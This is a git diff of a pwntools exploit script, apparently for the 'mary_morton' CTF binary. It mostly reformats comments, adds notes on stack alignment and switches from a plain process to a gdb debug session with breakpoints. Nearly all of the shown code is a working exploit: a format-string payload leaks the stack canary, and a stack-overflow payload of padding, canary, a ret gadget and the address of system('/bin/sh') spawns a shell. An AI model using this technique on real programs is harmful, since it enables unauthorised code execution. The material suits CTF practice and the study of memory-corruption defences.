@@ -12,24 +12,27 @@ binary = ELF("./mary_morton")
 # 3. use system() for win.
 
 # system('/bin/sh') caveat:
-# vfprintf() or do_system() in the 64 bit challenges then ensure the stack is 16 byte aligned 
-# before returning to GLIBC functions such as printf() and system(). The version of GLIBC packaged 
-# with Ubuntu 18.04 uses movaps instructions to move data onto the stack in some functions. 
-# The 64 bit calling convention requires the stack to be 16 byte aligned before a call instruction 
-# but this is easily violated during ROP chain execution, causing all further calls from 
-# that function to be made with a misaligned stack.
+# vfprintf() or do_system() in the 64 bit challenges then ensure 
+# the stack is 16 byte aligned before returning to GLIBC functions 
+# such as printf() and system(). The version of GLIBC packaged 
+# with Ubuntu 18.04 uses movaps instructions to move data onto the 
+# stack in some functions. The 64 bit calling convention requires 
+# the stack to be 16 byte aligned before a call instruction 
+# but this is easily violated during ROP chain execution, 
+# causing all further calls from that function to be made with a 
+# misaligned stack.
 
 # Variables
 binsh = 0x4008da
 ret = 0x400659
 
 
-p = process("./mary_morton")
-#p = gdb.debug("./mary_morton", '''
-#break *0x400826
-#break *0x400960
-#break *0x4009c8
-#''')
+#p = process("./mary_morton")
+p = gdb.debug("./mary_morton", '''
+break *0x400826
+break *0x400960
+break *0x4009c8
+''')
 
 # format string payload
 payload = ""
@@ -52,10 +55,10 @@ p.sendline("1")
 # stack overflow payload
 payload2 = ""
 payload2 += "A" * 136
-payload2 += p64(canary_leak) # <- Stack Canary goes here
+payload2 += p64(canary_leak) # <- Stack Canary leak goes here
 payload2 += "C" * 8
-payload2 += p64(ret)
-payload2 += p64(binsh) # <- system('/bin/sh') payload goes here
+payload2 += p64(ret) # <- Re-align the stack for do_system()
+payload2 += p64(binsh) # <- system('/bin/sh') address goes here
 
 # Stack Overflow with Canary Leak
 p.sendline(payload2)
